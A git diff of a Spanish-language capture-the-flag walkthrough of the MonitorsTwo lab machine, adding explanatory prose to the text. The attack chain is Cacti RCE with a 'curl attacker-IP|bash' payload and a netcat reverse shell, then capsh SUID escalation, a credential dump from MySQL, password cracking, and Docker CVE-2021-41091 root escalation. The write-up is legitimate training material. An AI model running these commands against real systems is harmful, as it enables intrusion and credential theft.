@@ -61,9 +61,10 @@ Nmap done: 1 IP address (1 host up) scanned in 34.30 seconds
 
 ## Website
 
-El sitio principal hostea una web con el servicio de Cacti.
+El sitio principal hostea una web con el servicio de `Cacti`.
 
 ![image-center](/assets/images/Pasted image 20260219021747.png)
+## Shell as www-data @container
 
 Mas en concreto, con la versión `1.2.22`
 
@@ -93,8 +94,11 @@ Shellcodes: No Results
 File Type: Python script, ASCII text executable
 Copied to: /home/zsln/Desktop/zsln/monitorsTwo/51166.py
 ```
+### Cacti RCE
 
-https://github.com/r1nzleer/RCE-Cacti-1.2.22/blob/main/cve-2022-46169.py
+Para dicha versión hay una vulnerabilidad que permite a un atacante ejecutar comandos remotamente en la maquina `(RCE)`, para la cual [encontre un repositorio](https://github.com/r1nzleer/RCE-Cacti-1.2.22/blob/main/cve-2022-46169.py) en Github con un PoC, 
+
+Probé ejecutando un `curl` hacia mi maquina, viendo así la respuesta.
 
 ```bash
  python3 cacti.py 10.129.228.231 'curl 10.10.17.19|bash'
@@ -111,23 +115,17 @@ https://github.com/r1nzleer/RCE-Cacti-1.2.22/blob/main/cve-2022-46169.py
 </body>
 </html>
 ```
+### Shell
+
+Genere con mi script una Reverse shell dentro del `index.html` y luego cree mi servidor en `Python`.
 
 ```bash
 gen_lin_rev 10.10.17.19 4444
 [+] Wrote Linux reverse shells to /home/zsln/Desktop/zsln/monitorsTwo/index.html
 
-┌──(root㉿kali)-[/home/zsln/Desktop/zsln/monitorsTwo]
-└─#
-┌──(root㉿kali)-[/home/zsln/Desktop/zsln/monitorsTwo]
-└─# wwww
-Command 'wwww' not found, did you mean:
-  command 'dwww' from deb dwww
-Try: apt install <deb name>
+<SNIP>
 
-┌──(root㉿kali)-[/home/zsln/Desktop/zsln/monitorsTwo]
-└─# wwww
-┌──(root㉿kali)-[/home/zsln/Desktop/zsln/monitorsTwo]
-└─# www
+www
 [eth0] 192.168.100.12
 [tun0] 10.10.17.19
 [/home/zsln/Desktop/zsln/monitorsTwo]
@@ -135,6 +133,14 @@ allPorts  cacti.py  exploit.py  index.html  port_scan
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.228.231 - - [19/Feb/2026 00:22:53] "GET / HTTP/1.1" 200 -
 ```
+
+Volví a enviar el mismo comando
+
+```bash
+python3 cacti.py 10.129.228.231 'curl 10.10.17.19|bash'
+```
+
+Y desde mi listener `nc` recibo la conexión como el usuario `www-data`.
 
 ```bash
 nc -nlvp 4444
@@ -144,6 +150,10 @@ connect to [10.10.17.19] from (UNKNOWN) [10.129.228.231] 40542
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+## Shell as root @container
+### SUID Binaries 
+
+Liste binarios con el bit `SUID`, dentro del contenedor,. viendo así a `capsh`.
 
 ```bash
 www-data@50bca5e748b0:/tmp$ find / -perm -4000 2>/dev/null
@@ -157,45 +167,23 @@ www-data@50bca5e748b0:/tmp$ find / -perm -4000 2>/dev/null
 /bin/umount
 /bin/su
 ```
+### Shell
+
+Para aprovechar el mismo para convertirme en `root` use la propia guía de [GTFObins](https://gtfobins.org/gtfobins/capsh/#shell), dándome así acceso como `root` en el contenedor.
 
 ```bash
 www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 --addamb=cap_setuid,cap_setgid --
 root@50bca5e748b0:/tmp# id
 uid=0(root) gid=0(root) groups=0(root),33(www-data)
 ```
+## Shell as marcus
+### MySQL connection
 
+Encontré un archivo de configuración con credenciales para la conexión de la base de datos local de la maquina.
 
-
-```bash
+```php
 www-data@50bca5e748b0:/home$ cat /var/www/html/include/config.php
-<?php
-/*
- +-------------------------------------------------------------------------+
- | Copyright (C) 2004-2020 The Cacti Group                                 |
- |                                                                         |
- | This program is free software; you can redistribute it and/or           |
- | modify it under the terms of the GNU General Public License             |
- | as published by the Free Software Foundation; either version 2          |
- | of the License, or (at your option) any later version.                  |
- |                                                                         |
- | This program is distributed in the hope that it will be useful,         |
- | but WITHOUT ANY WARRANTY; without even the implied warranty of          |
- | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |
- | GNU General Public License for more details.                            |
- +-------------------------------------------------------------------------+
- | Cacti: The Complete RRDtool-based Graphing Solution                     |
- +-------------------------------------------------------------------------+
- | This code is designed, written, and maintained by the Cacti Group. See  |
- | about.php and/or the AUTHORS file for specific developer information.   |
- +-------------------------------------------------------------------------+
- | http://www.cacti.net/                                                   |
- +-------------------------------------------------------------------------+
-*/
-
-/*
- * Make sure these values reflect your actual database/host/user/password
- */
-
+<SNIP>
 $database_type     = 'mysql';
 $database_default  = 'cacti';
 $database_hostname = 'db';
@@ -207,6 +195,8 @@ $database_ssl      = false;
 $database_ssl_key  = '';
 ```
 
+Use las mismas para obtener los datos de la columna `user_auth`, obteniendo así el hash del usuario `marcus`.
+
 ```bash
 www-data@50bca5e748b0:/home$ mysql -h db -u root -proot cacti -e "select username, password from user_auth;"
 +----------+--------------------------------------------------------------+
@@ -217,6 +207,9 @@ www-data@50bca5e748b0:/home$ mysql -h db -u root -proot cacti -e "select usernam
 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
 +----------+--------------------------------------------------------------+
 ```
+### Crack password
+
+El mismo lo rompí usando `john`.
 
 ```bash
  j hash
@@ -228,55 +221,22 @@ Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 funkymonkey      (?)
 ```
+### Shell
+
+Y con la password que conseguí me conecte por `ssh`.
 
 ```bash
 ssh marcus@10.129.228.231
-The authenticity of host '10.129.228.231 (10.129.228.231)' can't be established.
-ED25519 key fingerprint is: SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.129.228.231' (ED25519) to the list of known hosts.
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-marcus@10.129.228.231's password:
-Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Thu 19 Feb 2026 05:39:09 AM UTC
-
-  System load:                      0.0
-  Usage of /:                       63.1% of 6.73GB
-  Memory usage:                     14%
-  Swap usage:                       0%
-  Processes:                        236
-  Users logged in:                  0
-  IPv4 address for br-60ea49c21773: 172.18.0.1
-  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
-  IPv4 address for docker0:         172.17.0.1
-  IPv4 address for eth0:            10.129.228.231
-  IPv6 address for eth0:            dead:beef::250:56ff:fe95:d831
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
+<SNIP>
 
 You have mail.
 Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
 marcus@monitorstwo:~$ cat user.txt
-31a90376585ac8611dd1ee89dacbe288
+31a903...
 ```
+## Shell as root
+
+Es de notar que en el mismo login de `ssh` me dice que tengo un `mail`, el cual se puede ver el mismo en `/var/mail`.
 
 ```bash
 marcus@monitorstwo:/var/mail$ cat marcus
@@ -303,12 +263,20 @@ CISO
 Monitor Two
 Security Team
 ```
-https://github.com/jrbH4CK/CVE-2021-41091
+### CVE-20210-41091
+
+En el mismo `mail` cuente sobre varias vulnerabilidades que el equipo de `marcus`, debería de parchear. De las cuales solo la ultima aplica para este caso, ya que se basa en contenedores de `Docker`, de manera que primero uno de los requisitos es convertirse en `root` en dicho contenedor para luego asignar a la bash el bit `SUID`.
+En [este repositorio](https://github.com/jrbH4CK/CVE-2021-41091) encontré ambos script el cual primero en el contenedor realiza dicha acción y luego en la maquina host intenta ejecutar dicho binario con el bit `SUID` asignado o cualquiera que cumpla este requisito en el contenedor y asi ejecutarlo ya que para el sistema operativo dicho binario pertenece a root en la maquina host tambien.
+### Shell
+
+Primero desde la shell en el contenedor ejecuto el primero. O de todas formas se puede ejecutar este comando `chmod u+s /bin/bash`.
 
 ```bash
 root@50bca5e748b0:/tmp# ./d.sh
 Ejecutal el script principal.sh en la maquina principal
 ```
+
+Y desde la maquina como `marcus`, ejecuto el segundo, el cual se encarga de buscar el contenedor que casi siempre se encuentra en la ruta `/var/lib/docker/overlay2`, para luego ejecutar el binario.
 
 ```bash
 marcus@monitorstwo:/tmp$ ./principal.sh
@@ -324,5 +292,7 @@ root
 
 ```bash
 bash-5.1# cat root.txt
-9495a70107ee0d27036f11000bd5e111
+9495a701...
 ```
+
+`~Happy Hacking.`
